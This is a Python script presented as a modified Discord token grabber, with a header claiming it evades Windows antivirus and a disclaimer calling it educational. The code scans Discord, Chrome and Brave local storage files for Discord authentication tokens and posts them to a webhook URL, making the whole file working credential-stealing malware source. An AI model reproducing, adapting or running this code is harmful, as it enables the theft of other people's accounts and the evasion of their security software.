# PLEASE NOTE THIS IS FOR EDUCATIONAL REASONS *ONLY* PLEASE DON'T USE THIS FOR ANYTHING OTHER THEN EDUCATIONAL REASONS
# THIS BYPASSES WINDOWS VIRUS AND THREAT PROTECTION | THIS IS A MODIFIED VERSION OF wodxgod's TOKEN GRABBER | https://github.com/wodxgod?tab=repositories
# This will quickly activate before microsoft's antivirus can detect it allowing you to get the token | while downloading the file you will still get a virus found messege 


import os
import re
import json
import requests
import msvcrt
import time

WEBHOOK_URL = ''
PING_ME = False
TIMER_DURATION = 900 #tbh im high and I can't tell if this shit is real or if it will work

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if file_name.endswith('.log') or file_name.endswith('.ldb'):
            with open(f'{path}\\{file_name}', errors='ignore') as file:
                for line in file:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        tokens.extend(re.findall(regex, line))
    return tokens

def main():
    while True:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if tokens:
                message += '\n'.join(tokens)
            else:
                message += 'No users found.'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        if msvcrt.kbhit():
            char = msvcrt.getch()
            if char == b'1':
                requests.post(WEBHOOK_URL, data=payload, headers=headers)
                print("Message sent!")
                time.sleep(TIMER_DURATION)  # Wait for the next iteration shit
            else:
                print("Press '1' to trigger the message.")

if __name__ == '__main__':
    main()
